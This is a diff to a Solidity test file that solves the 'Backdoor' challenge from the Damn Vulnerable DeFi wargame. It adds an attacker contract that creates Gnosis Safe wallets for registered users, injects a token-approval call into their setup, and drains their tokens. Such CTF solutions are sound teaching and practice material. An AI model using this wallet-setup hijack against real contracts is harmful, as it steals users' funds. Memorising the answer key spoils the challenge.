@@ -8,6 +8,64 @@ import {DamnValuableToken} from "src/DamnValuableToken.sol";
 import {WalletRegistry} from "src/backdoor/WalletRegistry.sol";
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
 import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
+import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
+import {IProxyCreationCallback} from "gnosis/proxies/IProxyCreationCallback.sol";
+
+contract AttackerContract {
+
+    DamnValuableToken internal dvt;
+    GnosisSafe internal masterCopy;
+    GnosisSafeProxyFactory internal walletFactory;
+    WalletRegistry internal walletRegistry;
+
+
+    constructor(address payable masterAddr, address factoryAddr,
+        address walletRegAddr, address tokenAddr)
+    {
+        masterCopy = GnosisSafe(masterAddr);
+        walletFactory = GnosisSafeProxyFactory(factoryAddr);
+        walletRegistry = WalletRegistry(walletRegAddr);
+        dvt = DamnValuableToken(tokenAddr);
+    }
+
+    function tokenApprove(address user) external {
+        dvt.approve(user, 10 ether);
+    }
+
+    ///can create the users gnosis safe wallet for them with callback that will
+    ///allow us to take their tokens
+    function setupProxies(address[] memory users) external {
+
+        for (uint256 i = 0; i < 4; i++) {
+            address[] memory user = new address[](1);
+            user[0] = users[i];
+
+            bytes memory initializer = abi.encodeWithSelector(
+                GnosisSafe.setup.selector, 
+                user,
+                1,
+                address(this),
+                abi.encodeWithSignature("tokenApprove(address)", 
+                    address(this)),
+                address(0),
+                0,
+                0,
+                0
+            );
+
+            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
+                address(masterCopy),
+                initializer,
+                i,
+                walletRegistry
+            );
+
+            console2.log("balance of proxy", i, dvt.balanceOf(address(proxy)));
+            dvt.transferFrom(address(proxy), msg.sender, 10 ether);
+        }
+    }
+}
+
 
 contract Backdoor is Test {
     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
@@ -79,7 +137,11 @@ contract Backdoor is Test {
         /**
          * EXPLOIT START *
          */
-
+        AttackerContract attack = new AttackerContract(payable(masterCopy),
+            address(walletFactory),
+            address(walletRegistry),
+            address(dvt));
+        attack.setupProxies(users);
         /**
          * EXPLOIT END *
          */
